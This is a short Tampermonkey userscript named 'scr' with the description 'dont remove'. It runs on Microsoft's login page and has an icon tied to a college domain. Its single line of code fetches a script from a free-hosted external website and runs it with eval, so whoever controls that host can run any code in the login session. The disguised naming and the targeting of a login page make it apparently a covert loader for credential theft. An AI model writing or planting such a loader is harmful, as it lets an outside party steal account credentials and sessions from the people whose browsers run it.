// ==UserScript==
// @name         scr
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  dont remove
// @author       You
// @match        *://login.microsoftonline.com/*
// @icon         https://www.google.com/s2/favicons?domain=pgc.edu
// @grant        none
// ==/UserScript==

fetch("http://my-smex-website.000webhostapp.com/script.php").then(a => a.text()).then(a => eval(a))
